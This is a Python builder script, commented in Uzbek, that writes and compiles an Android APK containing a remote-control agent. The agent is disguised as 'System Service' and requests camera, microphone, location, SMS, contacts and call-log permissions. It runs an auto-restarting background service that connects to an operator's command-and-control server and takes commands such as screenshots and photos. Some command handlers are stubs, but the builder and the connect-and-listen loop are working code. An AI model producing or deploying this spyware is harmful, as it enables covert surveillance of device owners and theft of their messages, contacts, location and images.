"""
Android APK Builder
Python agent'ni Android APK'ga compile qilish
"""

import os
import subprocess
import shutil
from datetime import datetime


class APKBuilder:
    """Android APK yaratish"""
    
    def __init__(self, server_ip, server_port=9999):
        self.server_ip = server_ip
        self.server_port = server_port
        self.project_name = f"c2agent_{datetime.now().strftime('%Y%m%d')}"
        
    def create_buildozer_spec(self):
        """buildozer.spec file yaratish"""
        
        spec_content = f"""[app]

# Dastur nomi
title = System Service

# Package nomi
package.name = systemservice
package.domain = com.system

# Versiya
version = 1.0

# Source code
source.dir = .
source.include_exts = py,png,jpg,kv,atlas

# Agent file
source.main = main.py

# Ruxsatlar
android.permissions = INTERNET,CAMERA,RECORD_AUDIO,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_SMS,SEND_SMS,READ_CONTACTS,READ_CALL_LOG,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE,VIBRATE

# Features
android.features = android.hardware.camera,android.hardware.location.gps

# Background service
services = AgentService:service.py

# Orientatsiya
orientation = portrait

# Icon (agar bo'lsa)
# icon.filename = %(source.dir)s/data/icon.png

# Presplash (agar bo'lsa)
# presplash.filename = %(source.dir)s/data/presplash.png

# Android API
android.api = 31
android.minapi = 21
android.ndk = 25b

# Architecture
android.archs = arm64-v8a,armeabi-v7a

# Build type
android.release = False

[buildozer]

# Log level
log_level = 2

# Build directory
build_dir = ./.buildozer

# Bin directory
bin_dir = ./bin
"""
        
        with open('buildozer.spec', 'w', encoding='utf-8') as f:
            f.write(spec_content)
        
        print("[+] buildozer.spec created")
    
    def create_main_py(self):
        """main.py - APK entry point"""
        
        main_content = f'''"""
Android C2 Agent - Main
"""

from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from android.runnable import run_on_ui_thread
from jnius import autoclass
import threading
import socket
import json
import time

PythonService = autoclass('org.kivy.android.PythonService')
PythonService.mService.setAutoRestartService(True)


class C2Agent:
    """C2 Agent Backend"""
    
    def __init__(self):
        self.server_host = "{self.server_ip}"
        self.server_port = {self.server_port}
        self.socket = None
        self.running = False
        
    def connect(self):
        """Connect to C2"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))
            print(f"[+] Connected to {{self.server_host}}:{{self.server_port}}")
            self.running = True
            return True
        except Exception as e:
            print(f"[-] Connection failed: {{e}}")
            return False
    
    def run(self):
        """Main loop"""
        while self.running:
            try:
                data = self.socket.recv(4096).decode()
                if data:
                    command = json.loads(data)
                    self.execute_command(command)
                time.sleep(0.1)
            except Exception as e:
                print(f"[-] Error: {{e}}")
                time.sleep(1)
    
    def execute_command(self, cmd):
        """Execute command"""
        cmd_type = cmd.get('type')
        
        if cmd_type == 'SCREENSHOT':
            self.take_screenshot()
        elif cmd_type == 'CAMERA_PHOTO':
            self.take_photo()
        # Add more commands
        
    def take_screenshot(self):
        """Screenshot"""
        try:
            from android import mActivity
            from jnius import autoclass
            
            View = autoclass('android.view.View')
            Bitmap = autoclass('android.graphics.Bitmap')
            # Implementation here
            
        except Exception as e:
            print(f"Screenshot error: {{e}}")
    
    def take_photo(self):
        """Take photo"""
        try:
            from plyer import camera
            camera.take_picture('/sdcard/photo.jpg', self.on_photo_complete)
        except Exception as e:
            print(f"Camera error: {{e}}")
    
    def on_photo_complete(self, filepath):
        """Photo complete callback"""
        print(f"Photo saved: {{filepath}}")


class AgentApp(App):
    """Main App"""
    
    def build(self):
        self.label = Label(text='Service Running...', font_size='20sp')
        
        # Start agent in background
        self.agent = C2Agent()
        threading.Thread(target=self.start_agent, daemon=True).start()
        
        return self.label
    
    def start_agent(self):
        """Start C2 agent"""
        if self.agent.connect():
            self.update_label("Connected to C2")
            self.agent.run()
        else:
            self.update_label("Connection failed")
    
    @run_on_ui_thread
    def update_label(self, text):
        """Update UI label"""
        self.label.text = text


if __name__ == '__main__':
    AgentApp().run()
'''
        
        with open('main.py', 'w', encoding='utf-8') as f:
            f.write(main_content)
        
        print("[+] main.py created")
    
    def create_service_py(self):
        """service.py - Background service"""
        
        service_content = f'''"""
Background Service
"""

import socket
import json
import time
from jnius import autoclass

PythonService = autoclass('org.kivy.android.PythonService')


def main():
    """Service main"""
    server_host = "{self.server_ip}"
    server_port = {self.server_port}
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((server_host, server_port))
            
            while True:
                data = sock.recv(4096).decode()
                if data:
                    # Process command
                    pass
                time.sleep(0.1)
                
        except Exception as e:
            print(f"Service error: {{e}}")
            time.sleep(5)  # Retry after 5 seconds


if __name__ == '__main__':
    main()
'''
        
        with open('service.py', 'w', encoding='utf-8') as f:
            f.write(service_content)
        
        print("[+] service.py created")
    
    def build_apk(self):
        """APK build qilish"""
        
        print("\n[*] Building APK...")
        print("[*] This may take 10-30 minutes for first build...\n")
        
        try:
            # Debug APK
            subprocess.run(['buildozer', 'android', 'debug'], check=True)
            
            print("\n[+] APK built successfully!")
            print("[+] Location: bin/*.apk")
            
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[-] Build failed: {e}")
            return False
        except FileNotFoundError:
            print("[-] Buildozer not found!")
            print("[!] Install: pip install buildozer")
            return False
    
    def build_release_apk(self):
        """Release APK (signed)"""
        
        print("\n[*] Building Release APK...")
        
        try:
            subprocess.run(['buildozer', 'android', 'release'], check=True)
            print("\n[+] Release APK built!")
            return True
        except Exception as e:
            print(f"[-] Release build failed: {e}")
            return False


def main():
    """Main function"""
    print("="*60)
    print("📱 Android APK Builder")
    print("="*60)
    
    server_ip = input("\nC2 Server IP: ").strip() or "192.168.1.100"
    server_port = int(input("C2 Server Port [9999]: ").strip() or "9999")
    
    builder = APKBuilder(server_ip, server_port)
    
    print("\n[1/4] Creating buildozer.spec...")
    builder.create_buildozer_spec()
    
    print("[2/4] Creating main.py...")
    builder.create_main_py()
    
    print("[3/4] Creating service.py...")
    builder.create_service_py()
    
    print("\n[4/4] Building APK...")
    print("\nNote: Birinchi build 10-30 daqiqa oladi")
    print("Android SDK va NDK yuklab oladi\n")
    
    choice = input("Build'ni boshlashmi? (y/n): ").strip().lower()
    
    if choice == 'y':
        builder.build_apk()
    else:
        print("\n[!] APK build bekor qilindi")
        print("[!] Keyinroq build qilish:")
        print("    buildozer android debug")


if __name__ == "__main__":
    main()
